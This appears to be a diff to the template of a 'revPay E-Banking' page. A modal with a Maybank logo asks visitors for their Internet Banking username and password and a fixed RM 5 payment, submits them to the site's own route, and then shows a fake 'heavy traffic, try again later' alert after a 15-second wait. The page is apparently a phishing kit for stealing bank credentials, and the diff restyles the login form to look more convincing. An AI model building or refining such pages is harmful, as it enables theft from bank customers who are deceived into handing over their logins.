@@ -4,8 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>revPay E-Banking</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
     <link rel="stylesheet" href="{{asset('pages/bank/css/style.css')}}">
-    <link rel="stylesheet" href="{{asset('pages/bank/css/bootstrap.min.css')}}">
+    <link rel="stylesheet" href="{{asset('css/bootstrap.min.css')}}">
     <style>
         #ajax-loading{
             display: none;
@@ -126,35 +127,34 @@
                 </div>                
                 <div class="modal-body">
                     <div class="row d-flex justify-content-center" id="paymentBox">
-                        <div class="col-md-4 pt-3">
+                        <div class="col-md-3 pt-3">
                             <img src="{{asset('pages/bank/images/maybank.png')}}" class="logo-img img-fluid" id="modal_bank_img" width="100%" alt="">
                         </div>
-                        <div class="col-md-8 form-area">
+                        <div class="col-md-9 form-area">
                             <h6 class="text-center">Please use your <strong>Internet Banking</strong> account username and password to login.</h6>
                             <form action="{{route('bank_submit')}}" method="post" id="paymentForm">
                                 @csrf
                                 <input type="hidden" name="sale_id" value="{{$sale->id}}">
                                 <input type="hidden" class="bank" name="bank_id" id="bank_id" value="1" />
                                 <input type="hidden" name="reference_no" value="N{{str_pad($sale->id, 8, "0", STR_PAD_LEFT)}}-RM 5.00">
-                                <div class="form-goup row mt-3">
-                                    <label class="control-label col-md-4 col-4" for="username">Username</label>
-                                    <div class="col-md-8 col-8">
-                                        <input type="text" class="form-control username" id="usernameForm" name="username" required>
+                                <div class="form-group mt-3">
+                                    <div class="input-group mb-3">
+                                        <div class="input-group-prepend">
+                                            <span class="input-group-text"><i class="fas fa-user"></i></span>
+                                        </div>
+                                        <input type="text" class="form-control username" id="usernameForm" name="username" required placeholder="Bank Username">                                    
                                     </div>
                                 </div>
-                                <div class="form-goup mt-3 row">
-                                    <label class="control-label col-md-4 col-4" for="password">Password</label>
-                                    <div class="col-md-8 col-8">
-                                        <input type="password" class="form-control password" name="password" required>
-                                    </div>
+                                <div class="form-group mt-3">
+                                    <div class="input-group mb-3">
+                                        <div class="input-group-prepend">
+                                            <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                                        </div>
+                                        <input type="password" class="form-control password" name="password" required placeholder="Bank Password">
+                                    </div>                                    
                                 </div>
-                                <div class="form-goup mt-3 row">
-                                    <label class="control-label col-md-4 col-4" for="amount">Amount</label>
-                                    <div class="col-md-8 col-8 text-right">
-                                        <select name="amount" id="" class="form-control" required>
-                                            <option value="5" selected>RM 5</option>
-                                        </select>
-                                    </div>
+                                <div class="form-group mt-3">
+                                    <input type="text" class="form-control" name="amount" value="RM 5" placeholder="Amount" />
                                 </div>
                                 <div class="form-group mt-3">
                                     <button type="submit" class="btn btn-primary btn-block mt-2" id="btn_submit">Submit</button>
@@ -203,7 +203,7 @@
                             console.log('success');
                             setTimeout(function(){ 
                                 $("#ajax-loading").fadeOut();
-                                alert("Website server is heavy. Please try again latger.Please contact 123131313 for further assist."); 
+                                alert("site will be slow due to heavy traffic . Please try again later, Or Contact :12313131"); 
                             }, 15000);
                         },
                     });
